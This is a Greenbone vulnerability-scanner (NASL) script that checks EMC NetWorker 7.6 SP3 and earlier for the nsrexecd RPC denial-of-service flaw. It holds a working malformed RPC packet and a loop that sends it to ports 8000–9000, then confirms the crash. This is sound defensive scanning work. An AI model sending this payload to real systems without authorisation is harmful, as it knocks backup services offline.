# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:emc:networker";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802831");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2012-04-09 12:23:36 +0530 (Mon, 09 Apr 2012)");
  script_name("EMC NetWorker 'nsrexecd' RPC Packet DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("gb_emc_networker_portmapper_detect.nasl");
  script_require_ports("Services/emc_networker_portmapper", 7938);
  script_mandatory_keys("emc/networker/portmapper/detected");

  script_xref(name:"URL", value:"http://aluigi.org/poc/nsrexecd_1.dat");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52506");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/74035");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18601/");
  script_xref(name:"URL", value:"http://aluigi.altervista.org/adv/nsrexecd_1-adv.txt");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause denial of
  service condition.");

  script_tag(name:"affected", value:"EMC NetWorker version 7.6 SP3 and prior.");

  script_tag(name:"insight", value:"The flaw is due to an error in the NetWorker Remote Exec Service
  (nsrexecd.exe), which fails to compute hash value when processing malformed RPC packets. Which
  could be exploited by remote attackers to crash an affected server which listens on some default
  ports in range 8000 to 9000 used for the RPC programs 390435 and 390436.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"summary", value:"EMC NetWorker is prone to a denial of service (DoS)
  vulnerability.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("host_details.inc");

if(!netPort = get_app_port(cpe:CPE, service:"emc_networker_portmapper"))
  exit(0);

if(!get_app_location(cpe:CPE, port:netPort, nofork:TRUE))
  exit(0);

req = raw_string(0x80, 0x00, 0x01, 0x00, 0x4e, 0x5a, 0xa2, 0xa9, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x05,
                 0xf3, 0xe1, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x14,
                 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x4e,
                 0x5a, 0xa2, 0xa9, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0xac, 0x00, 0x00, 0x00, 0x05,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00,
                 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x14, 0x68, 0x61,
                 0x73, 0x68, 0x68, 0x61, 0x73, 0x68, 0x68, 0x61, 0x73,
                 0x68, 0x68, 0x61, 0x73, 0x68, 0x68, 0x61, 0x73, 0x68,
                 0x00, 0x00, 0x00, 0x80,
                 crap(data:raw_string(0x78), length:128), 0x00, 0x00,
                 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
                 0x80, 0x00, 0x00, 0x54, 0x4d, 0x5a, 0xa2, 0xa9, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x05,
                 0xf3, 0xe1, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
                 0x03, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x18,
                 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x4d,
                 0x5a, 0xa2, 0xa9, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
                 0x00, 0x04, 0x09, 0xab, 0x5a, 0x4f, 0x00, 0x00, 0x00,
                 0x06, 0x00, 0x00, 0x00, 0x14, 0x68, 0x61, 0x73, 0x68,
                 0x68, 0x61, 0x73, 0x68, 0x68, 0x61, 0x73, 0x68, 0x68,
                 0x61, 0x73, 0x68, 0xbe, 0xbe, 0xbf, 0x0f);

for(nsPort = 8000; nsPort < 9000; nsPort++) {
  if(!get_port_state(nsPort))
    continue;

  if(!soc = open_sock_tcp(nsPort))
    continue;

  send(socket:soc, data:req);

  res = recv(socket:soc, length:1024);
  close(soc);

  if(res && hexstr(res) =~ "^800000304e5aa2a9") {

    sleep(7);
    soc2 = open_sock_tcp(nsPort);

    if(!soc2) {
      security_message(port:nsPort);
      exit(0);
    }

    send(socket:soc2, data:req);
    res = recv(socket:soc2, length:1024);
    close(soc2);

    if(!res) {
      security_message(port:nsPort);
      exit(0);
    }
  }
}

exit(99);